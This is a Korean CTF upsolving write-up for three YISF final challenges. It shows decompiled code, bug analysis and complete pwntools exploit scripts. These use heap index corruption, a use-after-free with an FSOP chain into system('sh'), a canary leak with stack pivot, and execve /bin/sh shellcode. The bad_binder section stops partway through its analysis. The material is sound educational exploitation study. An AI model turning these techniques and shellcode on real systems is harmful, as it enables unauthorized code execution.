yisf 본선에 진출한 팀원에게 문제를 받아 업솔빙을 진행하였다.

1. Home_Sweet_Home
2. m2Protector_LoL
3. bad_binder

---
# Home_Sweet_Home

```bash
[*] '/mnt/d/yisf/final/home_sweet_home/prob'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
```

PIE가 꺼져 있고 canary가 없다.

```c
__int64 sub_401389()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("House index : ");
  __isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 <= 0x19 && qword_404060[v1] )
  {
    printf("House address : %p\n", (const void *)qword_404060[v1]);
    printf("House data : %s\n", (const char *)qword_404060[v1]);
    ++dword_404040;
    return 0LL;
  }
  else
  {
    puts("Invalid house!");
    return 0xFFFFFFFFLL;
  }
}

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 v3; // rax
  int v5; // [rsp+Ch] [rbp-194h] BYREF
  _BYTE v6[400]; // [rsp+10h] [rbp-190h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  qword_4041A8 = (__int64)malloc(0x20uLL);
  v3 = qword_4041A8;
  *(_QWORD *)qword_4041A8 = 'naM ytiC';
  strcpy((char *)(v3 + 8), "ager");
  *(_DWORD *)(qword_4041A8 + 20) = 0;
  *(_QWORD *)(qword_4041A8 + 24) = sub_4015AC;
  puts("============================================");
  printf("Welcome to the YISF City : %p\n", v6);
  puts("============================================");
  while ( 2 )
  {
    puts("\n===== City Management =====");
    puts("1. Buy house");
    puts("2. Sell house");
    puts("3. View house");
    puts("4. Decorate house");
    puts("5. Redevelopment");
    puts("6. Exit");
    printf("> ");
    __isoc99_scanf("%d", &v5);
    switch ( v5 )
    {
      case 1:
        sub_4011F6();
        continue;
      case 2:
        sub_4012D6();
        continue;
      case 3:
        if ( !dword_404040 )
        {
          (*(void (**)(void))(qword_4041A8 + 24))();
          continue;
        }
        return 0xFFFFFFFFLL;
      case 4:
        sub_40147A();
        continue;
      case 5:
        sub_401560(v6);
        continue;
      default:
        return 0LL;
    }
  }
}
```

3번의 함수 포인터 실행에 집중하자. 현재 저장되어 있는 `sub_4015AC`은 아무 기능도 안 하지만 `sub_401389`로 바꾸면 릭을 할 수 있다.

```c
__int64 sub_4011F6()
{
  int v1; // ebx
  int v2[3]; // [rsp+Ch] [rbp-14h] BYREF

  if ( dword_4041A4 <= 25 )
  {
    printf("House size : ");
    __isoc99_scanf("%d", v2);
    v1 = dword_4041A4;
    qword_404060[v1] = malloc(v2[0]);
    dword_404140[dword_4041A4] = v2[0];
    printf("House bought at index %d\n", dword_4041A4);
    ++dword_4041A4;
    return 0LL;
  }
  else
  {
    puts("City is full!");
    return 0xFFFFFFFFLL;
  }
}
```

`create` 부분이다. 인덱스 계산을 해보면 `&dword_404140[25] == &dword_4041A4`이다. 따라서 인덱스 변조가 가능하고, 이를 음수로 변경하면 의도하지 않은 곳에 값을 쓸 수 있다. 이는 `qword_404060` 영역에 `bss` 영역의 주소를 넣어서 `qword_4041A8`를 변조하는 시나리오로 이용한다.

```c
__int64 sub_40147A()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("House index : ");
  __isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 <= 25 && qword_404060[v1] )
  {
    printf("Decoration : ");
    read(0, (void *)qword_404060[v1], (int)dword_404140[v1]);
    puts("House decorated!");
    return 0LL;
  }
  else
  {
    puts("Invalid house!");
    return 0xFFFFFFFFLL;
  }
}

__int64 sub_4012D6()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("House index : ");
  __isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 <= 0x19 && qword_404060[v1] )
  {
    free((void *)qword_404060[v1]);
    puts("House sold!");
    return 0LL;
  }
  else
  {
    puts("Invalid house!");
    return 0xFFFFFFFFLL;
  }
}
```

`edit`도 있고, `free`에서는 `UAF`도 발생한다. `edit`에서 함수 포인터를 릭 함수로 변조하고 `unsorted bin`에 있는 청크로 `heap, libc` 릭을 동시에 한 다음 `FSOP`로 마무리한다.

### ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    #'b *0x401796',
    #'b *0x401545',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("chall.polygl0ts.ch", 9036)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def create(sz : int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(sz).encode())

def delete(idx : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def read(idx : int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())

def edit(idx : int, ctt : bytes):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', ctt)

create(0x420)
create(0x100)
create(0x100)
for i in range(22):
    create(0x18)
create(-11)
create(0x4041a8-4)
create(0)
delete(0)
delete(1)
delete(2)
edit(23, p32(3) + p64(0x4041A8 - 0x10) + p64(0x401389))
read(0)
heap_base = int(p.recvline().split(b': ')[1][:-1], 16)
heap_base >>= 12
heap_base <<= 12
l.address = u64(p.recvline().split(b': ')[1][:-1].ljust(8, b'\x00')) - 0x21ace0
print(hex(heap_base))
print(hex(l.address))

fake_fsop_struct = l.sym['_IO_2_1_stdout_']
stdout_lock = l.address + 0x21ca70
FSOP = FSOP_struct(
	flags=u64(b"\x01\x01\x01\x01;sh\x00"),
	lock=stdout_lock,
	_wide_data=fake_fsop_struct - 0x10,
	_markers=l.symbols["system"],
	_unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
	vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
	_mode=0xFFFFFFFF,
)

print(hex(fake_fsop_struct))
edit(2, p64(fake_fsop_struct ^ (heap_base >> 12)) + b'a' * 8)
create(0x100)
create(0x100)
edit(4, FSOP)

p.interactive()
```

---
# m2Protector_LoL

```bash
[*] '/mnt/d/yisf/final/m2protector/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

PIE가 꺼져 있고, Partial RELRO이다.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+0h] [rbp-40h]
  int j; // [rsp+4h] [rbp-3Ch]
  _BYTE buf[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  admin_check(0LL);
  print_loading();
  print_chating();
  read(0, buf, 0x30uLL);
  for ( i = 0; i <= 47; ++i )
  {
    if ( buf[i] == 10 )
    {
      buf[i] = 0;
      break;
    }
  }
  print_again(buf);
  print_last();
  read(0, buf, 0x50uLL);
  for ( j = 0; j <= 47; ++j )
  {
    if ( buf[j] == 10 )
    {
      buf[j] = 0;
      break;
    }
  }
  print_end(buf);
  sleep(1u);
  puts("패배 !");
  sleep(1u);
  puts("게임이 종료되었습니다.");
  return 0;
}

int __fastcall print_again(const char *a1)
{
  printf("돌거북 : 뭐? 너 지금 %s \b라고 했냐?\n", a1);
  return printf("나(어스름 늑대) : ");
}
```

입력을 세 번 받고, 그 중 유의미한 입력은 처음과 마지막이다. 마지막 입력은 `ret`까지 덮을 수 있어서 이를 `admin_check` 함수로 변조할 것이다. 첫 입력은 `%s`로 출력해준다. 여기서 `canary`를 딸 수 있다.

```c
unsigned __int64 __fastcall admin_check(__int64 a1)
{
  size_t len; // [rsp+18h] [rbp-28h] BYREF
  unsigned __int64 v3; // [rsp+20h] [rbp-20h]
  __int64 *v4; // [rsp+28h] [rbp-18h]
  void *addr; // [rsp+30h] [rbp-10h]
  unsigned __int64 v6; // [rsp+38h] [rbp-8h]
  __int64 savedregs; // [rsp+40h] [rbp+0h] BYREF
  unsigned __int64 retaddr; // [rsp+48h] [rbp+8h]

  v6 = __readfsqword(0x28u);
  v3 = retaddr;
  v4 = &savedregs;
  if ( retaddr < 0x400000 || v3 > 0x401A11 )
  {
    puts("do not jump admin_check");
    exit(0);
  }
  if ( a1 == masterkey )
  {
    len = sysconf(30);
    addr = (void *)((unsigned __int64)&len & -(__int64)len);
    mprotect(addr, len, 7);
    sub_routine(a1);
  }
  return v6 - __readfsqword(0x28u);
}

unsigned __int64 __fastcall sub_routine(__int64 a1)
{
  size_t len; // [rsp+18h] [rbp-38h] BYREF
  unsigned __int64 v3; // [rsp+20h] [rbp-30h]
  void *addr; // [rsp+28h] [rbp-28h]
  char buf[24]; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]
  unsigned __int64 retaddr; // [rsp+58h] [rbp+8h]

  v6 = __readfsqword(0x28u);
  v3 = retaddr;
  if ( retaddr < 0x400000 || v3 > 0x401A11 )
  {
    puts("do not jump sub_routine");
    exit(0);
  }
  if ( a1 != masterkey )
  {
    puts("key error");
    exit(0);
  }
  len = sysconf(30);
  addr = (void *)((unsigned __int64)&len & -(__int64)len);
  mprotect(addr, len, 7);
  LOBYTE(len) = 0;
  while ( 1 )
  {
    puts("관리자 계정에 로그인 되었습니다.\n");
    puts("어떤 명령을 수행하시겠습니까?");
    puts("1. 입력");
    puts("2. 출력");
    puts("3. 종료");
    read(0, &len, 1uLL);
    getchar();
    if ( (char)len == 51 )
      break;
    if ( (char)len > 51 )
      goto LABEL_15;
    if ( (char)len == '1' )
    {
      puts("입력 : ");
      read(0, buf, 0x60uLL);
    }
    else if ( (char)len == 50 )
    {
      puts("출력 : ");
      printf("%s", buf);
    }
    else
    {
LABEL_15:
      puts("잘못된 입력입니다.");
    }
  }
  puts("종료합니다.");
  return v6 - __readfsqword(0x28u);
}
```

`admin check`의 조건문을 통과하면 스택을 `RWX`로 만들고, `sub_routine` 함수에서 `bof`를 제공해서 쉘코드로 쉘을 딸 수 있다. 근데 `masterkey`가 `bss`에 저장되어 있기 때문에 주소를 알아서, `main`의 마지막 입력 때 `sfp`를 잘 조작해주면 조건을 만족하게 할 수 있다.

### ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'set follow-fork-mode parent',
    #'b *0x401828',
    'b *0x401932',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("chall.polygl0ts.ch", 9036)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))

master_key = 0x1534ee7faeb1c2aa
p.sendafter(b') : ', b'a' * 0x29)
p.recvuntil(b'a' * 0x29)
canary = u64(b'\x00' + p.recvn(7))
print(hex(canary))
p.sendafter(b') : ', b'a')
p.sendafter(b') : ', b'a' * 0x28 + p64(canary) + p64(0x4040d0 + 0x38) + p64(0x40164d))

shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
p.sendlineafter(b'3.', b'1')
p.sendafter(b': ', b'a' * 0x20)
p.sendlineafter(b'3.', b'2')
p.recvuntil(b'a' * 0x20)
stack = u64(p.recvn(6).ljust(8, b'\x00')) - 0x50 + 0x10
p.sendlineafter(b'3.', b'1')
p.sendafter(b': ', b'a' * 0x18 + p64(canary) + p64(stack) * 2 + shellcode)
p.sendlineafter(b'3.', b'3')

p.interactive()
```

---
# bad_binder

```bash
[*] '/mnt/d/yisf/final/bad_binder/prob'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

특징은 없다.

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h]

  puts("Welcome to YISF 2025!");
  puts("We learning about android binder IPC for Transaction and Exploit Tech");
  puts("Let's Dive into IPC World, Good Luck! [Made by Igunis]");
  puts("Waiting for init...");
  initialize();
  while ( 1 )
  {
    v3 = menu();
    if ( v3 == 3 )
    {
      puts("[-] Bye Bye~");
      exit(1);
    }
    if ( v3 > 3 )
      break;
    if ( v3 == 1 )
    {
      binder_ioctl();
    }
    else
    {
      if ( v3 != 2 )
        break;
      pipe_control();
    }
  }
  puts("Error: Invalid Input");
  exit(-1);
}

void *initialize()
{
  void *result; // rax

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  user_mem = mmap((void *)0x20000000, 0x4000uLL, 3, 49, -1, 0LL);
  result = user_mem;
  if ( user_mem == (void *)-1LL )
  {
    puts("[-] Uhmm... Restart Please!");
    exit(-1);
  }
  return result;
}
```

`user_mem`의 주소가 정해져 있다. 메뉴는 `binder_ioctl`과 `pipe_control`이 있다.

```c
__int64 binder_ioctl()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  printf("What you want ioctl ? ");
  read(0, user_mem, 0x4000uLL);
  puts("Okay,,, Let's go into binder ioctl !!");
  v1 = binder_ioctl_write_read(user_mem);
  if ( v1 )
    puts("Hmm... binder ioctl fail,, but it is necessary,,?");
  return v1;
}

__int64 __fastcall binder_ioctl_write_read(void *a1)
{
  int v2; // [rsp+1Ch] [rbp-34h]
  _QWORD dest[2]; // [rsp+20h] [rbp-30h] BYREF
  __int64 v4; // [rsp+30h] [rbp-20h]
  void *v5; // [rsp+38h] [rbp-18h]
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v2 = 1;
  memcpy(dest, a1, 0x20uLL);
  if ( !dest[0] || (v2 = binder_thread_write((void **)dest[1], dest[0]), v2 >= 0) )
  {
    if ( v4 )
      v2 = binder_thread_read(v5, v4);
  }
  memcpy(a1, dest, 0x20uLL);
  if ( v2 < 0 )
    puts("[-] Error Android binder ioctl read write");
  return (unsigned int)v2;
}

__int64 __fastcall binder_thread_write(void **a1, unsigned int a2)
{
  unsigned int v3; // [rsp+10h] [rbp-60h]
  int v4; // [rsp+14h] [rbp-5Ch]
  void **src; // [rsp+18h] [rbp-58h]
  void *ptr; // [rsp+28h] [rbp-48h]
  binder_transaction_data dest; // [rsp+30h] [rbp-40h] BYREF
  unsigned __int64 v8; // [rsp+68h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  src = a1;
  v3 = 0;
  while ( (void **)((char *)a1 + a2) > src && !v3 )
  {
    v4 = *(_DWORD *)src;
    src = (void **)((char *)src + 4);
    if ( v4 == 0x4201 )
    {
      ptr = *src;
      src = (void **)((char *)src + 1);
      if ( ptr )
        free(ptr);
      puts("[+] Android Binder: Data Free Success");
    }
    else if ( v4 == 0x46740 )
    {
      memcpy(&dest, src, sizeof(dest));
      src += 6;
      v3 = binder_transaction(&dest);
      if ( !v3 )
        puts("[+] Android Binder: Transaction Success");
    }
    else
    {
      puts("[-] Android Binder: Invalid CMD ioctl write");
      v3 = -1;
    }
  }
  return v3;
}
```

입력을 받고 `binder_thread_write`로 넘긴다. 여기서 명령어를 해석한 후에 `binder_transaction`로 보낸다. `user_mem`이 고정 주소이므로 잘 계산해서 페이로드를 짜면 된다.

```c
__int64 __fastcall binder_transaction(binder_transaction_data *a1)
{
  size_t offsets_size; // r12
  const void *offsets_buffer; // rbx
  char *user_data_buffer; // r13
  int v4; // eax
  int v5; // eax
  int v7; // [rsp+1Ch] [rbp-84h]
  unsigned __int64 i; // [rsp+20h] [rbp-80h]
  __int64 v9; // [rsp+28h] [rbp-78h]
  transaction_metadata *ptr; // [rsp+30h] [rbp-70h]
  unsigned __int64 v11; // [rsp+40h] [rbp-60h]
  __int64 v12; // [rsp+58h] [rbp-48h]
  _BYTE dest[24]; // [rsp+60h] [rbp-40h] BYREF
  unsigned __int64 v14; // [rsp+78h] [rbp-28h]

  v14 = __readfsqword(0x28u);
  ptr = (transaction_metadata *)malloc(0x30uLL);
  v9 = 0LL;
  target_mem = mmap(0LL, 0x4000uLL, 3, 33, -1, 0LL);
  if ( ptr && target_mem )
  {
    ptr->flags = a1->flags;
    ptr->code = a1->code;
    if ( (ptr->code & 1) != 0 )
    {
      ptr->user_data_buffer = malloc(a1->data_size + a1->offsets_size);
      offsets_size = a1->offsets_size;
      offsets_buffer = a1->offsets_buffer;
      user_data_buffer = (char *)ptr->user_data_buffer;
      v4 = align(a1->data_size, 8u);
      memcpy(&user_data_buffer[v4], offsets_buffer, offsets_size);
      v5 = align(a1->data_size, 8u);
      v11 = a1->offsets_size + v5;
      for ( i = v5; i < v11; i += 8LL )
      {
        v12 = *(_QWORD *)((char *)ptr->user_data_buffer + i);
        memcpy((char *)ptr->user_data_buffer + v9, a1->data_buffer, v12 - v9);
        v7 = *(_DWORD *)((char *)ptr->user_data_buffer + v9);
        memcpy(dest, (char *)ptr->user_data_buffer + 4, sizeof(dest));
        v9 = v12 + 24;
        if ( v12 + 24 > a1->data_size )
          goto LABEL_13;
        if ( v7 != 0x4142 )
        {
          puts("[-] Not Supported");
          goto LABEL_13;
        }
        memcpy(target_mem, dest, 0x18uLL);
      }
    }
    else
    {
      puts("[-] TF 2-Way is not supporting");
    }
    return 0LL;
  }
  else
  {
LABEL_13:
    if ( ptr->user_data_buffer )
      free(ptr->user_data_buffer);
    if ( target_mem )
      munmap(target_mem, 0x4000uLL);
    if ( ptr )
      free(ptr);
    return 0xFFFFFFFFLL;
  }
}
```

할당은 `data_size`를 참조해놓고, `memcpy`의 `n`은 `offsets_buffer`를 참조하기 때문에 `heap overflow`가 발생한다.

```c
__int64 pipe_control()
{
  __int64 result; // rax

  result = pipe_menu();
  if ( (int)result > 0 && (int)result <= 4 )
  {
    switch ( (_DWORD)result )
    {
      case 4:
        return pipe_write();
      case 3:
        return pipe_read();
      case 1:
        return pipe_create();
      default:
        return pipe_resize();
    }
  }
  return result;
}
```

`pipe_control`이다. `pipe_create`는 할당,